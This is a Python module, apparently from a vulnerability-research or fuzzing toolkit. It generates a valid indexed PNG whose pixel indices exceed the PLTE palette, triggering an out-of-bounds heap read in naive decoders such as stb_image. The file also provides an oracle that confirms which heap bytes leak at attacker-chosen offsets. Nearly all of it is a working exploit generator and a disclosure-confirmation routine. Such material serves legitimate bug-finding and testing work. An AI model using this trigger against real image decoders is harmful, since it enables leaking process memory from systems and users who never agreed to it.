"""Directed trigger for a PNG palette (PLTE) over-read behind the container (CWE-125 / CWE-200).

The PNG analogue of the GIF palette over-read in `palette_overread` (gif2rgb / CVE-2016-3977). A
colour-type-3 (indexed) PNG stores one palette index per pixel; the decoder maps each index into
the PLTE chunk's entries. A naive expander reads `palette[index]` without checking `index` against
the PLTE entry count -- stb_image's `stbi__expand_png_palette` and several embedded PNG readers do
exactly this -- so a pixel whose index is >= the number of PLTE entries reads past the palette and
copies adjacent heap into the decoded RGB output: an out-of-bounds READ that is also an information
DISCLOSURE.

A blind fuzzer almost never lands this: it must keep a STRUCTURALLY VALID PNG -- the 8-byte
signature, a well-formed IHDR, a PLTE, a zlib-compressed IDAT whose filtered scanlines decode to
the chosen indices, correct per-chunk CRC32s -- while making one decoded index exceed the palette,
and random mutation breaks a CRC or the zlib stream long before it does. Once a detector has
narrowed to the palette-index sink the trigger is not a search: build the smallest valid indexed
PNG whose palette is tiny and whose pixels are out of range. One construction, no campaign -- the
ASan build reports the over-read (L1) and the plain build turns it into a forgery-proof disclosure
(L3) exactly as the GIF path does.

Pure stdlib (struct + zlib), no libpng; the byte layout mirrors structure.py's PNG model.
"""
from __future__ import annotations

import struct
import zlib

_PNG_SIG = b"\x89PNG\r\n\x1a\n"


def _chunk(typ: bytes, data: bytes) -> bytes:
    """One PNG chunk: length (BE u32) + type + data + CRC32(type+data) (BE u32)."""
    return (struct.pack(">I", len(data)) + typ + data
            + struct.pack(">I", zlib.crc32(typ + data) & 0xFFFFFFFF))


def png_overindexed(*, colors: int = 2, index: int = 255, width: int = 8, height: int = 1,
                    palette: "bytes | None" = None) -> bytes:
    """A STRUCTURALLY VALID indexed (colour-type-3, 8-bit) PNG whose PLTE has `colors` entries and
    whose every pixel is `index`. When `index >= colors`, a decoder that indexes the palette by the
    pixel value reads past it.

    `palette`, when given, is the raw PLTE bytes (3*colors) -- used to plant a recognisable pattern
    for the disclosure oracle; otherwise a minimal black/white table. 8-bit depth keeps one index
    per byte (0..255), so a 2-entry palette with index 255 over-reads by a wide margin.
    """
    if not (0 <= index <= 255):
        raise ValueError("an 8-bit PNG palette index is one byte (0..255)")
    if colors < 1 or colors > 256:
        raise ValueError("a PLTE has 1..256 entries")
    if palette is None:
        pal = bytearray()
        for k in range(colors):
            v = 0 if k == 0 else 255
            pal += bytes((v, v, v))
        palette = bytes(pal)
    elif len(palette) != colors * 3:
        raise ValueError(f"palette must be {colors*3} bytes for a {colors}-entry table")

    # IHDR: width, height, bit depth 8, colour type 3 (indexed), compression/filter/interlace 0.
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 3, 0, 0, 0)
    # one filtered scanline per row: filter byte 0 (None) + `width` index bytes, zlib-compressed.
    raw = (b"\x00" + bytes((index,)) * width) * height
    idat = zlib.compress(raw, 9)
    return (_PNG_SIG + _chunk(b"IHDR", ihdr) + _chunk(b"PLTE", palette)
            + _chunk(b"IDAT", idat) + _chunk(b"IEND", b""))


# ------------------------------------------------------------------ L3: disclosure, forgery-proof

def confirm_disclosure(read_pixel, *, colors: int = 2, in_bounds_index: int = 0,
                       probe_indices=(32, 96, 160, 224), width: int = 64, height: int = 8) -> dict:
    """Confirm the PLTE over-read DISCLOSES heap memory at an attacker-chosen offset -- L3.

    `read_pixel(png_bytes) -> (r, g, b) | None` runs the NON-instrumented target on a constructed
    PNG and returns the first decoded output pixel (the bytes the over-read copied out). Identical
    sound, forgery-proof oracle to `palette_overread.confirm_disclosure`:

      * NEGATIVE CONTROL -- an IN-BOUNDS index returns exactly the known palette entry, so a decoder
        that bounds-checks or clamps can only ever return palette entries. This pins "safe".
      * POSITIVE -- two or more OUT-OF-RANGE indices (`index >= colours`) return byte triples that
        are each different from every palette entry AND differ from one another: the read address is
        `palette + index*stride`, so a changing index is a changing HEAP OFFSET, and the output is
        heap the file never declared, varying as the chosen offset varies.

    An echo of the input cannot forge this (the triples are heap, not input bytes); a safe decoder
    cannot produce offset-dependent non-palette bytes. A wider/taller image is used so the target
    populates the heap region the over-read reaches. Returns a verdict dict."""
    pal = bytearray()
    for k in range(colors):
        pal += bytes(((k * 17 + 1) & 0xFF, (k * 29 + 7) & 0xFF, (k * 43 + 13) & 0xFF))
    pal_entries = {tuple(pal[3 * k:3 * k + 3]) for k in range(colors)}

    def _px(idx):
        return read_pixel(png_overindexed(colors=colors, index=idx, width=width, height=height,
                                          palette=bytes(pal)))

    control = _px(in_bounds_index % colors)
    want = tuple(pal[3 * (in_bounds_index % colors):3 * (in_bounds_index % colors) + 3])
    if control != want:
        return {"disclosed": False, "control_ok": False, "control": control, "expected": want,
                "why": "in-bounds index did not return the known palette entry -- cannot trust the "
                       "channel (wrong output mode, or the target did not render)"}

    leaked = {}
    for idx in probe_indices:
        if idx < colors:
            continue
        px = _px(idx)
        if px is not None and tuple(px) not in pal_entries:
            leaked[idx] = tuple(px)

    distinct = set(leaked.values())
    disclosed = len(leaked) >= 2 and len(distinct) >= 2
    return {"disclosed": disclosed, "control_ok": True, "control": control, "colors": colors,
            "leaked": leaked,
            "why": (f"out-of-range palette indices disclosed {len(distinct)} distinct non-palette "
                    f"heap triples (attacker-chosen read offset palette+index*stride); the in-bounds "
                    f"index returned the palette entry as a negative control"
                    if disclosed else
                    "the over-read region held no attacker-distinguishable heap content on this "
                    "input (only zeros or palette-equal bytes) -- a larger/groomed heap is needed")}
